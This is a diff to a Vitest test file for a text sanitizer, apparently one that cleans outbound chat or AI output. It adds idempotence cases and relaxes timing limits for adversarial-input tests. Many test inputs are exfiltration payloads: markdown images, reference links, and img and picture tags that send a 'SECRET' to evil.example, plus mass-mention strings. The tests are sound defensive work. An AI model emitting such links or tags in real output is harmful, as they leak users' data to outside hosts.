@@ -1,7 +1,7 @@
 import { describe, expect, it } from 'vitest';
 import { sanitizeOutboundText } from './sanitize';
 
-const ZWSP = '​';
+const ZWSP = '\u200b';
 
 /** No tag, comment or declaration can open in the output. */
 function expectNoTagOpener(out: string) {
@@ -66,8 +66,42 @@ describe('sanitizeOutboundText reference definitions', () => {
   });
 });
 
+describe('sanitizeOutboundText is idempotent', () => {
+  it('removes definitions that a tag would hide', () => {
+    const cases = [
+      '<b>[x]: https://evil.example/?d=SECRET',
+      '> <b>[x]: https://evil.example/?d=SECRET',
+      '[x]<b>: https://evil.example/?d=SECRET',
+      '<b>[x]:\nhttps://evil.example/?d=SECRET',
+    ];
+    for (const input of cases) {
+      const out = sanitizeOutboundText(input);
+      expect(out).not.toContain('SECRET');
+      expect(sanitizeOutboundText(out)).toBe(out);
+    }
+  });
+
+  it('changes nothing on a second run for the delivery cases', () => {
+    const cases = [
+      'See ![chart](https://evil.example/?q=secret) @everyone <@&123> <@!45>',
+      '![x][r]\n[r]: https://evil.example/?s=SECRET',
+      'hi <img src="https://evil.example/?a=SECRET"> there',
+      '![a](https://evil.example/x_(1)?d=SECRET)',
+      '![a](https://evil.example/?d=SECRET',
+      '![a[b]](https://evil.example/?d=SECRET)',
+      '![r]\n> [r]: https://evil.example/?d=SECRET',
+      '![x][]\n[x]:\nhttps://evil.example/?d=SECRET',
+      '<picture><source srcset="https://evil.example/?d=SECRET"></picture>',
+    ];
+    for (const input of cases) {
+      const out = sanitizeOutboundText(input);
+      expect(sanitizeOutboundText(out)).toBe(out);
+    }
+  });
+});
+
 describe('sanitizeOutboundText is linear on adversarial input', () => {
-  const n = 200_000;
+  const n = 100_000;
   const adversarial = {
     'unclosed tags': '<a'.repeat(n),
     'nested openers': '<'.repeat(n) + 'a',
@@ -83,14 +117,15 @@ describe('sanitizeOutboundText is linear on adversarial input', () => {
   for (const [name, input] of Object.entries(adversarial)) {
     it(`handles ${name} quickly`, () => {
       const { out, ms } = timed(input);
-      expect(ms).toBeLessThan(1_000);
+      // A quadratic scan of this input takes tens of seconds.
+      expect(ms).toBeLessThan(3_000);
       expectNoTagOpener(out);
     });
   }
 
-  it('scales linearly rather than quadratically', () => {
-    const small = timed('<a'.repeat(50_000) + '!['.repeat(50_000)).ms;
-    const large = timed('<a'.repeat(400_000) + '!['.repeat(400_000)).ms;
+  it('scales linearly rather than quadratically', { timeout: 30_000 }, () => {
+    const small = timed('<a'.repeat(20_000) + '!['.repeat(20_000)).ms;
+    const large = timed('<a'.repeat(160_000) + '!['.repeat(160_000)).ms;
     // Eight times the input; a quadratic scan would take about 64 times as long.
     expect(large).toBeLessThan(Math.max(small, 5) * 24);
   });
